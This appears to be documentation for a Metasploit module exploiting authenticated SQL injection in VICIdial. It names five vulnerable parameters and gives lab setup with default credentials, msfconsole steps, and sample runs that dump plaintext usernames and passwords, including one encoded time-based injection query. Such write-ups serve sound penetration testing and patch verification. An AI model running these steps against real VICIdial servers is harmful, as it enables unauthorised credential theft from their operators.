## Vulnerable Application

This module exploits several authenticated SQL Inject vulnerabilities in VICIdial 2.14b0.5 prior to
svn/trunk revision 3555 (VICIBox 10.0.0, prior to January 20 is vulnerable).

- Injection point 1 is on vicidial/admin.php when adding a user, in the modify_email_accounts parameter.
- Injection point 2 is on vicidial/admin.php when adding a user, in the access_recordings parameter.
- Injection point 3 is on vicidial/admin.php when adding a user, in the agentcall_email parameter.
- Injection point 4 is on vicidial/AST_agent_time_sheet.php when adding a user, in the agent parameter.
- Injection point 5 is on vicidial/user_stats.php when adding a user, in the file_download parameter.

|                                           | v9.0.3                         | v10.0.0                        |
| ----------------------------------------- | ------------------------------ | ------------------------------ |
| List Users - access_recordings method     | X                              | X                              |
| List Users - agent_time_sheet method      | `view reports` must be enabled | `view reports` must be enabled |
| List Users - agentcall_email method       | X                              | X                              |
| List Users - modify_email_accounts method | X                              | X                              |
| List Users - user_stats method            | `view reports` must be enabled | `view reports` must be enabled |

VICIdial does not encrypt passwords by default.

VICIBox/VICIdial includes an auto-update mechanism, so be aware for creating vulnerable boxes.

### Install

#### 9.0.3 & 10.0.0

1. Install the following OpenSUSE 10 ISO [ViciBox_v9.x86_64-9.0.3.iso](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9.x86_64-9.0.3.iso)
or [ViciBox_v10.x86_64-10.0.0.iso](http://download.vicidial.com/iso/vicibox/server/archive/ViciBox_v10.x86_64-10.0.0.iso) :
    1. Change the default password (`root`:`vicidial`)
    2. Set Timezone, Keyboard Layout, ok the license, and Language
    3. Network settings should autoconfigure (Tested on VMware Fusion). Network settings can be configured with the 
        command `yast lan` if necessary
2. Run `vicibox-express` to initiate the ViciDial Express Installation, everything can be kept as default
3. Navigate to `http://<ip-address>/`
    1. Click `Administration` and login with default credentials username: `6666`, password: `1234`
    2. Once logged in, Click `Continue on to the Initial Setup`. Everything can be kept as default. 
4. The complete list of setup instructions can be found by following this [link](http://download.vicidial.com/iso/vicibox/server/ViciBox_v9-install.pdf)


## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/scanner/http/vicidial_multiple_sqli`
1. Do: `set username <username>`
1. Do: `set password <password>`
1. Do `show actions`
   1. Select from the list or keep the default
1. Do: `run`
1. The module will exploit the selected SQL injection and return the extracted usernames and passwords

## Options

### Password

Password for the vicidial instance that corresponds to the username.

### Username

Username for the user to login with. Defaults to admin username of `6666`.

## Scenarios

### ViciBox 9.0.3 - List Users - modify_email_accounts method

```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - modify_email_accounts method
action => List Users - modify_email_accounts method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[*] {SQLi} Executing (select group_concat(TXMlUAF) from (select cast(concat_ws(';',ifnull(user,''),ifnull(pass,'')) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
[*] {SQLi} Encoded to (select group_concat(TXMlUAF) from (select cast(concat_ws(0x3b,ifnull(user,repeat(0x87,0)),ifnull(pass,repeat(0x52,0))) as binary) TXMlUAF from vicidial_users limit 3) jUFFwQn)
[*] {SQLi} Time-based injection: expecting output of length 46
[!] No active DB -- Credential data will not be saved!
[+] Dumped table contents:
vicidial_users
==============

 user  pass
 ----  ----
 6666  notpassword
 VDAD  donotedit
 VDCL  donotedit

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### ViciBox 9.0.3 - List Users - access_recordings method

```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - access_recordings method
action => List Users - access_recordings method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[+] Dumped table contents:
vicidial_users
==============

 user  pass
 ----  ----
 6666  notpassword
 VDAD  donotedit
 VDCL  donotedit

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### ViciBox 9.0.3 - List Users - agent_time_sheet method

```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - agent_time_sheet method
action => List Users - agent_time_sheet method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[+] Dumped table contents:
vicidial_users
==============

 user  pass
 ----  ----
 6666  notpassword
 VDAD  donotedit
 VDCL  donotedit

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### ViciBox 9.0.3 - List Users - agentcall_email method

```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - agentcall_email method
action => List Users - agentcall_email method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[+] Dumped table contents:
vicidial_users
==============

 user  pass
 ----  ----
 6666  notpassword
 VDAD  donotedit
 VDCL  donotedit

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


### ViciBox 9.0.3 - List Users - user_stats method

```
msf6 use auxiliary/scanner/http/vicidial_multiple_sqli
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set password notpassword
password => notpassword
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > set action List Users - user_stats method
action => List Users - user_stats method
msf6 auxiliary(scanner/http/vicidial_multiple_sqli) > run

[*] Enumerating Usernames and Password Hashes
[+] Dumped table contents:
vicidial_users
==============

 user  pass
 ----  ----
 6666  notpassword
 VDAD  donotedit
 VDCL  donotedit

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
